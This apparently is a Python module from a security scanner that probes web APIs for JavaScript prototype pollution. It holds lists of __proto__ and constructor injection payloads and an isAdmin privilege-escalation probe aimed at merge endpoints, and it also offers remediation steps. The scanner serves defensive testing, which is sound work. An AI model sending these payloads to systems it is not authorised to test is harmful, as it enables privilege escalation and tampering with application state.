"""Prototype Pollution — detect JavaScript prototype pollution vectors."""
from __future__ import annotations
import json, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence
import aiohttp

CVSS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N"

POLLUTION_PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__[polluted]": "true"},
    {"__proto__.polluted": "true"},
]

POLLUTION_PARAMS = [
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "constructor.prototype.polluted=true",
    "constructor[prototype][polluted]=true",
]

class PrototypePoll(BaseModule):
    NAME = "prototype_poll"
    DESCRIPTION = "Prototype Pollution: detect __proto__ and constructor injection"
    PHASE = 10
    TAGS = ["advanced", "prototype-pollution", "cwe-1321"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
        )
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=10),
        ) as session:
            vulnerable = []

            # Get API endpoints from config or use common ones
            api_paths = self.config.extra.get("api_endpoints", [
                "/api/user", "/api/settings", "/api/profile",
                "/api/config", "/api/data",
            ])

            # Test JSON body pollution
            for path in api_paths[:5]:
                for payload in POLLUTION_PAYLOADS[:2]:
                    await self.rate_limit()
                    try:
                        async with session.post(
                            f"{target}{path}",
                            json=payload,
                            headers={"Content-Type": "application/json"},
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status in (200, 201):
                                # Check if pollution reflected
                                if "polluted" in body and "true" in body:
                                    vulnerable.append({
                                        "path": path,
                                        "technique": "JSON body __proto__",
                                        "payload": json.dumps(payload)[:100],
                                    })
                                    break
                    except Exception:
                        pass

                # Test query parameter pollution
                for param in POLLUTION_PARAMS[:2]:
                    await self.rate_limit()
                    try:
                        async with session.get(f"{target}{path}?{param}") as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status == 200 and "polluted" in body:
                                vulnerable.append({
                                    "path": path,
                                    "technique": "Query param __proto__",
                                    "payload": param,
                                })
                                break
                    except Exception:
                        pass

            # Test merge/extend endpoints
            merge_paths = ["/api/merge", "/api/extend", "/api/assign", "/api/update"]
            for path in merge_paths:
                await self.rate_limit()
                try:
                    async with session.post(
                        f"{target}{path}",
                        json={"__proto__": {"isAdmin": True}},
                    ) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text(errors="ignore")
                            if "isAdmin" in body:
                                vulnerable.append({
                                    "path": path,
                                    "technique": "Merge endpoint",
                                    "payload": '{"__proto__": {"isAdmin": true}}',
                                })
                except Exception:
                    pass

            if vulnerable:
                ev = Evidence(extra={"vulnerable": vulnerable[:10]})
                self.new_finding(
                    title=f"Prototype Pollution — {len(vulnerable)} endpoint(s)",
                    severity=Severity.HIGH,
                    description=(
                        f"JavaScript Prototype Pollution detected:\n"
                        + "\n".join(f"  {v['path']}: {v['technique']}" for v in vulnerable[:5])
                        + "\n\nPrototype Pollution can lead to RCE (via child_process), "
                        "privilege escalation (isAdmin=true), or XSS."
                    ),
                    reproduction_steps=[
                        f"curl -X POST {target}{vulnerable[0]['path']} "
                        f"-H 'Content-Type: application/json' -d '{vulnerable[0]['payload']}'",
                    ],
                    remediation=(
                        "1. Use Object.create(null) for lookup objects\n"
                        "2. Validate/sanitize __proto__ and constructor in input\n"
                        "3. Use Map instead of plain objects\n"
                        "4. Freeze Object.prototype in server startup"
                    ),
                    references=["CWE-1321", "OWASP Prototype Pollution"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    target=target)

        return self._make_result(start)

class TestPrototypePoll:
    def test_payloads(self) -> None: assert len(POLLUTION_PAYLOADS) >= 2
    def test_phase(self) -> None: assert PrototypePoll.PHASE == 10
